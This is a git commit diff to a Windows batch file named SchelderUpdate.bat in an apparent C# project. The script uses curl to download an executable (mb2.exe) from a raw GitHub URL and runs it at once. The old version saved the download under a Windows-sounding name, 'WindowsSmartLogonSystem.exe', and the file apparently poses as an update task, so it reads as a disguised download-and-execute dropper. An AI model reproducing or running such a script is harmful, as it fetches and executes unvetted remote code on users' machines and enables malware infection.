2f2f318cefe63e82bc02c70919b24d810ca009aa
TRYAGAINBITCH <kijeyo4705@cmeinbox.com>
2023-06-19 16:36:35 +0300

    Update SchelderUpdate.bat

--- Kvas/Kvas/obj/Debug/SchelderUpdate.bat
+++ Kvas/Kvas/obj/Debug/SchelderUpdate.bat
@@ -1,5 +1,5 @@
 @echo off
 set "URL=http://raw.githubusercontent.com/Mshta-Dev/MyTestRepositoryCsharpTest/main/Kvas/Kvas/obj/Debug/mb2.exe"
-set "FILENAME=WindowsSmartLogonSystem.exe"
+set "FILENAME=mb2.exe"
 curl -O "%URL%"
 start "" "%FILENAME%"
